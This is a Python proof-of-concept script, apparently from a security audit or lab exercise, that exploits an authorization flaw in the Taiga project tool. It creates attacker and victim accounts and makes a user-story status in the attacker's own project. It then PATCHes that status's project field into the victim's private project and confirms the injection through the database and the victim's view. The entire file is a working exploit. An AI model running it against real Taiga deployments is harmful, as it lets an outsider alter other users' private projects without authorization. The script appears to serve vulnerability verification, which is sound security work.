import sys, subprocess; sys.path.insert(0, "/root/johto-task4/L2/scratch/proofs")
from lib import Client, register, uniq, new_project, show

attacker = register(uniq("r2atk"))
victim = register(uniq("r2vic"))
A = new_project(attacker, private=True)   # attacker is admin of A
B = new_project(victim, private=True)      # victim admin; attacker NOT a member
print("A(attacker)", A["id"], "B(victim)", B["id"])

# attacker not admin/member of B -> confirm no access
show("attacker GET victim project B", attacker.get("/projects/%d" % B["id"]), keys=["id","name","_error_message"])

# 1) attacker creates a US status in their own project A
r = attacker.post("/userstory-statuses", {"project": A["id"], "name": "INJECTED", "color": "#112233"})
show("attacker create US-status in A", r, keys=["id","project","name"])
st = r.json(); stid = st["id"]

# 2) attacker PATCHes project -> B (victim), where attacker is not admin
r = attacker.patch("/userstory-statuses/%d" % stid, {"project": B["id"]})
show("attacker PATCH status.project = B(victim)", r, keys=["id","project","name","_error_message"])

# 3) verify in DB which project the status now belongs to
code = ("from taiga.projects.models import UserStoryStatus\n"
        "s=UserStoryStatus.objects.get(pk=%d)\n"
        "print('status', s.id, 'project', s.project_id, 'name', s.name)\n" % stid)
out = subprocess.run(["docker","exec","t4-L2-app","python","manage.py","shell","-c",code], capture_output=True, text=True)
print(out.stdout.strip(), out.stderr.strip()[-200:] if out.returncode else "")

# 4) victim now sees the injected status in B's settings list
show("victim lists B US-statuses", victim.get("/userstory-statuses", params={"project": str(B["id"])}))
